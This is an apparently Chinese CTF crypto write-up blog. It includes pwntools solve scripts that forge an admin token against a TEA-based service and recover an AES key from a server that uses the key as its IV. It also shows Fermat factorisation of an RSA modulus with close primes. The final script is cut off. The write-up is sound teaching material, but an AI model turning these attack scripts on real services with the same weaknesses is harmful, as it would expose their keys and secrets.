<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">myhash</span>(<span class="params">msg, identification</span>):</span></span><br><span class="line">    delta = <span class="number">0x9E3779B9</span></span><br><span class="line">    v0, v1 = <span class="built_in">map</span>(uint32, unpack(<span class="string">&#x27;&gt;2I&#x27;</span>, msg))</span><br><span class="line">    k0, k1, k2, k3 = <span class="built_in">map</span>(uint32, unpack(<span class="string">&#x27;&gt;4I&#x27;</span>, identification))</span><br><span class="line">    sm, delta = uint32(<span class="number">0</span>), uint32(delta)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">        sm.value += delta.value</span><br><span class="line">        v0.value += ((v1.value &lt;&lt; <span class="number">4</span>) + k0.value) ^ (v1.value + sm.value) ^ ((v1.value &gt;&gt; <span class="number">5</span>) + k1.value)</span><br><span class="line">        v1.value += ((v0.value &lt;&lt; <span class="number">4</span>) + k2.value) ^ (v0.value + sm.value) ^ ((v0.value &gt;&gt; <span class="number">5</span>) + k3.value)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> pack(<span class="string">&#x27;&gt;2I&#x27;</span>, v0.value, v1.value)</span><br></pre></td></tr></table></figure>

<p>找到了一篇<code>related key</code>的论文</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210923123147357.png" alt="image-20210923123147357"></p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210923123215428.png" alt="image-20210923123215428"></p>
<p>老韩出了，太简单了，我竟然没想到，不过这么简单，也隔了好么久才有人出，都被攻击流程给吸引过去了吧？前面出的人比较少，后面就多起来了</p>
<p>具体的不多说了，总之不是考攻击手法，就是考一下流程</p>
<p>TEA解密get，CTF真好玩</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> ascii_letters, digits</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> product</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> c_uint32 <span class="keyword">as</span> uint32</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack, unpack</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">sh = remote(<span class="string">&#x27;8.134.37.86&#x27;</span>, <span class="number">28204</span>)</span><br><span class="line">space = ascii_letters + digits</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">proof_of_work1</span>():</span></span><br><span class="line">    <span class="comment"># sha256(XXXX+9Bh7wL1Gd3Xvj1L6) == 89294055ff0e9581e25802cd7374448078c81867d91a0a8ca531f22b84cb6394</span></span><br><span class="line">    proof = sh.recvuntil(<span class="string">b&#x27;Give me XXXX:&#x27;</span>)</span><br><span class="line">    tail = proof[<span class="number">12</span>:<span class="number">28</span>].decode()</span><br><span class="line">    HASH = proof[<span class="number">33</span>:<span class="number">97</span>].decode()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> product(space, repeat=<span class="number">4</span>):</span><br><span class="line">        head = <span class="string">&#x27;&#x27;</span>.join(i)</span><br><span class="line">        t = hashlib.sha256((head+tail).encode()).hexdigest()</span><br><span class="line">        <span class="keyword">if</span> t == HASH:</span><br><span class="line">            sh.sendline(head.encode())</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">proof_of_work2</span>():</span></span><br><span class="line">    <span class="comment"># SHA-256(?+9grdX7Jcp1YGQQgo) == 31855f728b438952317f20b732181fc43a12e2ff058f4aab4e0a54781e204eca</span></span><br><span class="line">    tail = <span class="string">&#x27;aSNJw6WNPYK32RpR&#x27;</span></span><br><span class="line">    HASH = <span class="string">&#x27;7fa793e26380c281cc48eb6b335cee79fdcafd8355c69e1181541fc513604201&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> product(space, repeat=<span class="number">4</span>):</span><br><span class="line">        head = <span class="string">&#x27;&#x27;</span>.join(i)</span><br><span class="line">        t = hashlib.sha256((head+tail).encode()).hexdigest()</span><br><span class="line">        <span class="keyword">if</span> t == HASH:</span><br><span class="line">           <span class="built_in">print</span>(head)</span><br><span class="line">           <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tea_encrypt</span>(<span class="params">msg, identification</span>):</span></span><br><span class="line">    delta = <span class="number">0x9E3779B9</span></span><br><span class="line">    v0, v1 = <span class="built_in">map</span>(uint32, unpack(<span class="string">&#x27;&gt;2I&#x27;</span>, msg))</span><br><span class="line">    k0, k1, k2, k3 = <span class="built_in">map</span>(uint32, unpack(<span class="string">&#x27;&gt;4I&#x27;</span>, identification))</span><br><span class="line">    sm, delta = uint32(<span class="number">0</span>), uint32(delta)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">        sm.value += delta.value</span><br><span class="line">        v0.value += ((v1.value &lt;&lt; <span class="number">4</span>) + k0.value) ^ (v1.value + sm.value) ^ ((v1.value &gt;&gt; <span class="number">5</span>) + k1.value)</span><br><span class="line">        v1.value += ((v0.value &lt;&lt; <span class="number">4</span>) + k2.value) ^ (v0.value + sm.value) ^ ((v0.value &gt;&gt; <span class="number">5</span>) + k3.value)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> pack(<span class="string">&#x27;&gt;2I&#x27;</span>, v0.value, v1.value)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tea_decrypt</span>(<span class="params">cipher, key</span>):</span></span><br><span class="line">    delta = <span class="number">0x9E3779B9</span></span><br><span class="line">    <span class="built_in">sum</span> = <span class="number">0xC6EF3720</span></span><br><span class="line">    v0, v1 = <span class="built_in">map</span>(uint32, unpack(<span class="string">&#x27;&gt;2I&#x27;</span>, cipher))</span><br><span class="line">    k0, k1, k2, k3 = <span class="built_in">map</span>(uint32, unpack(<span class="string">&#x27;&gt;4I&#x27;</span>, key))</span><br><span class="line">    <span class="built_in">sum</span>, delta = uint32(<span class="built_in">sum</span>), uint32(delta)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">        v1.value -= ((v0.value &lt;&lt; <span class="number">4</span>) + k2.value) ^ (v0.value + <span class="built_in">sum</span>.value) ^ ((v0.value &gt;&gt; <span class="number">5</span>) + k3.value)</span><br><span class="line">        v0.value -= ((v1.value &lt;&lt; <span class="number">4</span>) + k0.value) ^ (v1.value + <span class="built_in">sum</span>.value) ^ ((v1.value &gt;&gt; <span class="number">5</span>) + k1.value)</span><br><span class="line">        <span class="built_in">sum</span>.value -= delta.value</span><br><span class="line">    <span class="keyword">return</span> pack(<span class="string">&#x27;&gt;2I&#x27;</span>, v0.value, v1.value)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">proof_of_work1()</span><br><span class="line">adminpass = <span class="string">b&#x27;Iamthesuperadmin&#x27;</span></span><br><span class="line">identification = <span class="string">b&#x27;IamthesuperadmiN&#x27;</span></span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;Choice:&#x27;</span>)</span><br><span class="line">sh.sendline(<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;I can hash for you&#x27;</span>)</span><br><span class="line">sh.sendline(identification)</span><br><span class="line">c = sh.recvline()[:-<span class="number">1</span>]</span><br><span class="line">nounce = tea_decrypt(c, identification)</span><br><span class="line"><span class="built_in">print</span>(nounce)</span><br><span class="line">payload = tea_encrypt(nounce, adminpass)</span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;Choice:&#x27;</span>)</span><br><span class="line">sh.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;Are you admin?&#x27;</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.recv()</span><br></pre></td></tr></table></figure>

<h2 id="Crypto-MyCipher（unsolved）"><a href="#Crypto-MyCipher（unsolved）" class="headerlink" title="Crypto-MyCipher（unsolved）"></a>Crypto-MyCipher（unsolved）</h2><p>感觉很上次那道很像，但是不知道怎么做，写了个解密函数，没有研究f和g怎么逆</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt_ecb</span>(<span class="params">msg, key</span>):</span></span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(msg) % <span class="number">4</span> == <span class="number">0</span></span><br><span class="line">    plaintext = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(msg), <span class="number">4</span>):</span><br><span class="line">        plaintext += decrypt(msg[i:i + <span class="number">4</span>], key)</span><br><span class="line">    <span class="keyword">return</span> plaintext</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span>(<span class="params">msg, key</span>):</span></span><br><span class="line">    subkeys = unpack(<span class="string">&#x27;&gt;4H&#x27;</span>, key)</span><br><span class="line">    left, right = unpack(<span class="string">&#x27;&gt;2H&#x27;</span>, msg)</span><br><span class="line">    left = right ^ left</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">        right = left</span><br><span class="line">        tmp = left ^ f(subkeys[<span class="number">2</span> - i] ^ right)</span><br><span class="line">        left = tmp</span><br><span class="line">    left = left ^ subkeys[<span class="number">3</span>]</span><br><span class="line">    <span class="keyword">return</span> pack(<span class="string">&#x27;&gt;2H&#x27;</span>, right, left)</span><br></pre></td></tr></table></figure>

<h2 id="Crypto-babypack（unsolved）"><a href="#Crypto-babypack（unsolved）" class="headerlink" title="Crypto-babypack（unsolved）"></a>Crypto-babypack（unsolved）</h2><p>比赛时没怎么看，有空再看吧</p>
]]></content>
      <categories>
        <category>树哥让我天天写之Crypto</category>
      </categories>
      <tags>
        <tag>团队WP</tag>
      </tags>
  </entry>
  <entry>
    <title>20210920 CTFSHOW月饼杯Crypto方向WP</title>
    <url>/posts/eabdfebd/</url>
    <content><![CDATA[<p>艹是真的卡</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210921164717044.png" alt="image-20210921164717044"></p>
<p>kw呜呜呜，苦露西</p>
<span id="more"></span>

<h1 id="月饼杯"><a href="#月饼杯" class="headerlink" title="月饼杯"></a>月饼杯</h1><h2 id="Crypto-我的木头啊！！！"><a href="#Crypto-我的木头啊！！！" class="headerlink" title="Crypto-我的木头啊！！！"></a>Crypto-我的木头啊！！！</h2><blockquote>
<p>我的宝贝木头怎么被别人拿去做了栅栏，该怎么让他把我的宝贝木头换回来</p>
</blockquote>
<blockquote>
<p>c6_I_@t216MG_0q_Uf673JTYYzBXs{31QJmTTg=hw63XZFZiHho5GzE} </p>
</blockquote>
<p>W型栅栏 6</p>
<blockquote>
<p>ctfshow{626173653136_MJQXGZJTGI_YmFzZTY0_qzTiEHgB_@UX=h}</p>
</blockquote>
<blockquote>
<p>ctfshow{base16_base32_base64_base58_base}</p>
</blockquote>
<h2 id="Crypto-切记务必一定要简单（recuring）"><a href="#Crypto-切记务必一定要简单（recuring）" class="headerlink" title="Crypto-切记务必一定要简单（recuring）"></a>Crypto-切记务必一定要简单（recuring）</h2><blockquote>
<p>在分解模数N的时候，除了yafu、factorDB之类现成的工具，我们还要学习一些<a href="https://ctf-wiki.org/crypto/asymmetric/rsa/rsa_module_attack">经典算法</a>背后的思想</p>
</blockquote>
<p>做个<img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/006D7C42.png" alt="img"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">N = <span class="number">2537578464060405716805986209629349306801585799475566769629753550869939275098596985321844853409568013133264210149682740766024366488982429837531169509250859483526118776072099712258599263748732430570800661306460224380741403478451009927665855604092871949705081574682507168392533782265954982321389235080917435497979848348321877319477780053855288297818739223795823021264136388271573286209636548206594797813576810688640228747147522219625866870777713858310084857747151891233766790129427051420839675334815589489194938107230004427317376438129284740257550482956744843496127593401991789197386269415091390162278183972481279010769071314265529328954115911712467352483233380953386631332500882467</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="number">1595212140002311449986774328911538131302021292459414446518934463751924694901681197719356391632660947700772362140375795419149621042035212501260054901239960931458611414432758551692762707025705203714868544808208482382713403084945106505851948109261999900909705955010772382362799626266428855540493176898287751627555377040483120618564113186968911259319525250268854097054159722810266326281435235140862840574780793343440289233893489065111751815693510473980454574606688640074455096644717769189843656600438932454630073349737743755427817726253307163184245099133341515200474243399626081459226215410055396366269535409932990065250476999485239927630147382130648035686165068584532121265385100009</span></span><br></pre></td></tr></table></figure>

<p>我以后再也不相信签到题了</p>
<hr>
<p>好家伙这道题是有源码的啊？？？这一天天魂不守舍得坐这里（不对（小声）我记得一开始是没有源码的）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random, sys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_prime</span>(<span class="params">base, offset</span>):</span></span><br><span class="line">    l = base - (<span class="number">1</span> &lt;&lt; offset)</span><br><span class="line">    r = base + (<span class="number">1</span> &lt;&lt; offset)</span><br><span class="line">    p = random.randrange(l, r) | <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="keyword">not</span> isPrime(p)):</span><br><span class="line">        p += <span class="number">2</span></span><br><span class="line">    <span class="keyword">return</span> p</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    p = getPrime(<span class="number">1127</span>)</span><br><span class="line">    q0 = p * <span class="number">13</span> // <span class="number">17</span></span><br><span class="line">    q = get_prime(q0, <span class="number">573</span>) <span class="comment"># Konami</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        flag = bytes_to_long(f.read())</span><br><span class="line">    N = p * q</span><br><span class="line">    <span class="keyword">assert</span> isPrime(p) <span class="keyword">and</span> isPrime(q) <span class="keyword">and</span> flag &lt; N</span><br><span class="line">    e = <span class="number">0x10001</span></span><br><span class="line">    c = <span class="built_in">pow</span>(flag, e, N)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;N = <span class="subst">&#123;N&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;e = <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;c = <span class="subst">&#123;c&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>整体代码比较短，p是1127位的素数，q与p有关，是$[\lfloor13p/17\rfloor-2^{573},\ \lfloor13p/17\rfloor+2^{573}]$中的一个质数，好吧给我源码也不会</p>
<p>来预习一下大整数分解的算法，之前都是直接跑工具的，参考<a href="https://ctf-wiki.org/crypto/asymmetric/rsa/rsa_module_attack/">https://ctf-wiki.org/crypto/asymmetric/rsa/rsa_module_attack/</a></p>
<p>费马分解emmmmm我，其实春哥师傅给的链接里的算法我都要试过，但是没有看到费马分解，原来在</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210922112229978.png" alt="image-20210922112229978"></p>
<p>不过费马分解也算是大整数分解较为常见的了，学习学习</p>
<p>首先对于RSA里的模数N，显然可以写成$N=pq=(\frac{p+q}{2})^2-(\frac{p-q}{2})^2$，当然别的素合数也可以这样拆解</p>
<p>如果p和q很接近，$(\frac{p-q}{2})^2$肯定很小，变换一下上面的等式<br>$$<br>(\frac{p+q}{2})^2-N=(\frac{p-q}{2})^2<br>$$<br>我们枚举$a,\ a=\frac{p+q}{2}$，可以从$\sqrt{N}$开始（我的理解是要看p和q具体差多少，$\sqrt{N}$只是幌子），如果$|N-a^2|$是完全平方数，说明我们找到了，之后就是解个方程的事</p>
<p>燃鹅，这里略有不同，正如春哥师傅的博客里写到，是<br>$$<br>|13p-17q|<br>$$<br>比较小，emmmmm有个$2^{573}$算小吗</p>
<p>先照搬照抄费马分解的<br>$$<br>(\frac{13p+17q}{2})^2-13\times 17N=(\frac{13p-17q}{2})^2<br>$$<br>把N乘以一个221，就和费马分级完全一样了，写两个脚本</p>
<p>这是一般的费马，虽然下面这个例子可以直接开方，但大致意思吧；用sage解方程有点奇怪</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">P = getPrime(<span class="number">512</span>)</span><br><span class="line">Q = next_prime(P)</span><br><span class="line">N = P * Q</span><br><span class="line">a = iroot(N, <span class="number">2</span>)[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">if</span> iroot(<span class="built_in">abs</span>(a ** <span class="number">2</span> - N), <span class="number">2</span>)[<span class="number">1</span>]:</span><br><span class="line">        x = iroot(<span class="built_in">abs</span>(a ** <span class="number">2</span> - N), <span class="number">2</span>)[<span class="number">0</span>]</span><br><span class="line">        p = symbols(<span class="string">&#x27;p&#x27;</span>)</span><br><span class="line">        q = symbols(<span class="string">&#x27;q&#x27;</span>)</span><br><span class="line">        ans = solve([p * q - N, p - q - <span class="number">2</span> * x], [p, q])[<span class="number">0</span>]</span><br><span class="line">        p = <span class="built_in">abs</span>(ans[<span class="number">0</span>])</span><br><span class="line">        q = <span class="built_in">abs</span>(ans[<span class="number">1</span>])</span><br><span class="line">        <span class="built_in">print</span>(p, q)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    a += <span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>稍微改一下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env sage</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">N = <span class="number">2537578464060405716805986209629349306801585799475566769629753550869939275098596985321844853409568013133264210149682740766024366488982429837531169509250859483526118776072099712258599263748732430570800661306460224380741403478451009927665855604092871949705081574682507168392533782265954982321389235080917435497979848348321877319477780053855288297818739223795823021264136388271573286209636548206594797813576810688640228747147522219625866870777713858310084857747151891233766790129427051420839675334815589489194938107230004427317376438129284740257550482956744843496127593401991789197386269415091390162278183972481279010769071314265529328954115911712467352483233380953386631332500882467</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="number">1595212140002311449986774328911538131302021292459414446518934463751924694901681197719356391632660947700772362140375795419149621042035212501260054901239960931458611414432758551692762707025705203714868544808208482382713403084945106505851948109261999900909705955010772382362799626266428855540493176898287751627555377040483120618564113186968911259319525250268854097054159722810266326281435235140862840574780793343440289233893489065111751815693510473980454574606688640074455096644717769189843656600438932454630073349737743755427817726253307163184245099133341515200474243399626081459226215410055396366269535409932990065250476999485239927630147382130648035686165068584532121265385100009</span></span><br><span class="line"></span><br><span class="line">N = <span class="number">221</span> * N</span><br><span class="line">a = iroot(N, <span class="number">2</span>)[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">if</span> iroot(<span class="built_in">abs</span>(a ** <span class="number">2</span> - N), <span class="number">2</span>)[<span class="number">1</span>]:</span><br><span class="line">        x = iroot(<span class="built_in">abs</span>(a ** <span class="number">2</span> - N), <span class="number">2</span>)[<span class="number">0</span>]</span><br><span class="line">        p = symbols(<span class="string">&#x27;p&#x27;</span>)</span><br><span class="line">        q = symbols(<span class="string">&#x27;q&#x27;</span>)</span><br><span class="line">        ans = solve([<span class="number">221</span> * p * q - N, <span class="number">13</span> * p - <span class="number">17</span> * q - <span class="number">2</span> * x], [p, q])[<span class="number">0</span>]</span><br><span class="line">        p = <span class="built_in">int</span>(<span class="built_in">abs</span>(ans[<span class="number">0</span>]))</span><br><span class="line">        q = <span class="built_in">int</span>(<span class="built_in">abs</span>(ans[<span class="number">1</span>]))</span><br><span class="line">        <span class="keyword">assert</span> p * q == N // <span class="number">221</span></span><br><span class="line">        <span class="built_in">print</span>(long_to_bytes(<span class="built_in">pow</span>(c, <span class="built_in">int</span>(invert(e, (p-<span class="number">1</span>)*(q-<span class="number">1</span>))), N // <span class="number">221</span>)))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    a += <span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>好家伙是动态flag</p>
<h2 id="Crypto-一封信"><a href="#Crypto-一封信" class="headerlink" title="Crypto-一封信"></a>Crypto-一封信</h2><p>有点意思，之前在某次套娃中用到</p>
<blockquote>
<p>有一天，小明收到了一封名为mooncake的信，你可以帮他破解吗？</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">馃檭馃挼馃尶馃帳馃毆馃審馃悗馃馃毇馃槅鉁咅煈夝煍勷煄ゐ煈屸尐馃憫馃巺馃槏馃崕馃毇鈽傪煒€馃榾馃悩馃悕馃檭馃ぃ鈽€馃崕馃敩鈽傪煡嬸煄堭煃庰煒傪煃岎煇庰煂婐煍勷煄咅煔煂忦煈岎煄凁煍煒○煈ｐ煔煃答煔梆煢擆煏桂煒嗮煈夆劰鈴┾湁馃洨馃寜馃搨馃尶馃攧馃榾馃崒馃尶馃槑鈴煠ｐ煒傪煃庰煆庰煍勨尐馃尶鉁夆尐馃檭鈽凁煃庘槂馃毇馃崓馃槀馃槀鈱煑掟煑�</span><br></pre></td></tr></table></figure>

<p>首先有生僻字有平假名有欧元，直接搜索无果，而且会出来一堆需要web手去检查的东西；然后想到昨天的长城杯，虽然没意思，但有时候思路很重要，我觉得应该不会有个加密的结果是这样的，这可能是乱码，所以utf-8编码试了试，得到</p>
<p>🙃💵🌿🎤🚪🌏🐎🥋🚫😆✅👉🔄🎤👌⌨👑🎅😍🍎🚫☂😀😀🐘🐍🙃🤣☀🍎🔬☂🥋🎈🍎😂🍌🐎🌊🔄🎅🚫🌏👌🎃🔬😡👣🚪🍴🚰🦓🕹😆👉ℹ⏩✉🛩🌉📂🌿🔄😀🍌🌿😎⏩🤣😂🍎🏎🔄⌨🌿✉⌨🙃☃🍎☃🚫🍍😂😂⌨🗒🗒</p>
<p>emoji编码，也就是base100编码是不对滴，找到师傅的博客<a href="https://miaotony.xyz/2021/02/11/CTF_2021NewsCTF/#toc-heading-10">https://miaotony.xyz/2021/02/11/CTF_2021NewsCTF/#toc-heading-10</a>，说是aes emoji，需要key，结合hint中有mooncake，出</p>
<p>看到春哥师傅博客中还提到</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210922161818032.png" alt="image-20210922161818032"></p>
<p>先记下</p>
<h2 id="Crypto-沐沐子倒拔垂杨柳"><a href="#Crypto-沐沐子倒拔垂杨柳" class="headerlink" title="Crypto-沐沐子倒拔垂杨柳"></a>Crypto-沐沐子倒拔垂杨柳</h2><blockquote>
<p>沐沐子相了一相，走到树前，把直掇脱了，用右手向下，把身倒缴着；却把左手拔住上截，把腰只一趁，将那株绿杨树带根拔起。</p>
</blockquote>
<blockquote>
<p>众菜鸡见了，一齐拜倒在地，只叫：”沐沐子非是凡人，正是真汉子！身体无千万斤气力，如何拔得起！”</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">cipher = AES.new(self.willow, AES.MODE_CBC, iv=self.willow)</span><br></pre></td></tr></table></figure>

<p>emmmmm</p>
<p>一时间找不到表达狂笑的表情包</p>
<p>具体请参考题目<a href="https://blog.csdn.net/m0_49109277/article/details/120199397?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522163211958816780269885785%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&request_id=163211958816780269885785&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_v2~rank_v29-6-120199397.pc_v2_rank_blog_default&utm_term=cbc&spm=1018.2226.3001.4450">Yusa的密码学课堂—CBC第三课</a>，再次感谢尚师傅带我</p>
<hr>
<p>flag总共有三段，<code>change</code>是选择哪一段密文，<code>Shake</code>是加密，<code>Kick</code>是解密，密文明文由我们send，加密解密的key和iv都来自flag，主要的流程是</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">handle</span>(<span class="params">self</span>):</span></span><br><span class="line"></span><br><span class="line">    self.send(banner)</span><br><span class="line">    self.willow = self.select_level()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        self.send(<span class="string">&quot;1: Shake the willow&quot;</span>)</span><br><span class="line">        self.send(<span class="string">&quot;2: Kick the willow&quot;</span>)</span><br><span class="line">        self.send(<span class="string">&quot;3: Change a willow&quot;</span>)</span><br><span class="line">        self.send(<span class="string">&quot;4: Give up&quot;</span>)</span><br><span class="line">        choice = self.receive().decode()</span><br><span class="line">        <span class="keyword">if</span> choice == <span class="string">&quot;1&quot;</span>:</span><br><span class="line">            self.shake_willow()</span><br><span class="line">        <span class="keyword">elif</span> choice == <span class="string">&quot;2&quot;</span>:</span><br><span class="line">            self.kick_willow()</span><br><span class="line">        <span class="keyword">elif</span> choice == <span class="string">&quot;3&quot;</span>:</span><br><span class="line">            self.willow = self.select_level()</span><br><span class="line">        <span class="keyword">elif</span> choice == <span class="string">&quot;4&quot;</span>:</span><br><span class="line">            self.send(<span class="string">&quot;886!&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br></pre></td></tr></table></figure>

<p>想到上次吉林师傅给的题目，key和iv是相同的，只要一次解密和一次加密就可以得到一段flag</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">BLOCK_SIZE = <span class="number">16</span></span><br><span class="line">port = <span class="number">28083</span></span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">sh = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>, port)</span><br><span class="line"></span><br><span class="line">plaintext = <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">32</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">attack</span>(<span class="params">tip</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">b&#x27;&gt;&#x27;</span>)</span><br><span class="line">    sh.sendline(tip)</span><br><span class="line">    sh.recvuntil(<span class="string">b&#x27;&gt;&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">b&#x27;&gt;&#x27;</span>)</span><br><span class="line">    sh.sendline(plaintext.<span class="built_in">hex</span>())</span><br><span class="line">    sh.recvline()</span><br><span class="line">    cipher = <span class="built_in">bytes</span>.fromhex(sh.recvline()[:-<span class="number">1</span>].decode())</span><br><span class="line">    c3, c4 = cipher[:<span class="number">16</span>], cipher[<span class="number">16</span>:<span class="number">32</span>]</span><br><span class="line">    sh.recvuntil(<span class="string">b&#x27;&gt;&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">b&#x27;&gt;&#x27;</span>)</span><br><span class="line">    sh.sendline(c4.<span class="built_in">hex</span>())</span><br><span class="line">    sh.recvline()</span><br><span class="line">    res = <span class="built_in">bytes</span>.fromhex(sh.recvline()[:-<span class="number">1</span>].decode())</span><br><span class="line">    key = xor(res, c3)</span><br><span class="line">    sh.recvuntil(<span class="string">b&#x27;&gt;&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> key</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    flag += attack(<span 